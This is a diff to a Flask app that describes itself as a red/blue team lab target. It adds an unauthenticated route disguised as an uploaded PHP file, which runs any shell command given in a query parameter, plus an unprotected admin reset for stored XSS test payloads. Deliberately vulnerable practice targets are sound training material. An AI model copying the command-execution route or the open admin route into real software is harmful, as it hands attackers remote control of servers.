@@ -577,6 +577,32 @@ def login():
     return render_template_string(html, avatar_url=avatar_url)
 
 
+# Route: Simulated Webshell (uploaded via /profile - demonstrates File Upload → RCE)
+# This simulates what a PHP webshell would do after being uploaded and executed
+@app.route("/static/uploads/shell.php")
+def webshell():
+    cmd = request.args.get("cmd", "id")
+    result = subprocess.getoutput(cmd)
+    return f"<pre>{result}</pre>", 200
+
+
+# Route: Reset Feedback Board (Lab utility - clears stored XSS payloads for testing)
+@app.route("/admin/reset-feedback")
+def reset_feedback():
+    global FEEDBACK_ITEMS
+    FEEDBACK_ITEMS = [
+        {"user": "Sarah C.", "time": "2026-09-06 14:30", "comment": "Great to see the new server monitoring dashboard live!"},
+        {"user": "Alex M.", "time": "2026-09-07 09:15", "comment": "Please remember to update your profile avatars before Friday."}
+    ]
+    return '''
+    <html><body style="background:#0b0f19; color:#f8fafc; font-family:Inter,sans-serif; text-align:center; padding-top:100px;">
+        <h2 style="color:#10b981;">&#10003; Feedback board has been reset!</h2>
+        <p style="color:#94a3b8;">All XSS test payloads have been cleared.</p>
+        <a href="/feedback" style="color:#3b82f6;">Go back to Feedback Board</a>
+    </body></html>
+    '''
+
+
 if __name__ == "__main__":
     print("==================================================================")
     print("  NEXUS ENTERPRISE PORTAL - RED/BLUE TEAM LAB TARGET INITIALIZED  ")
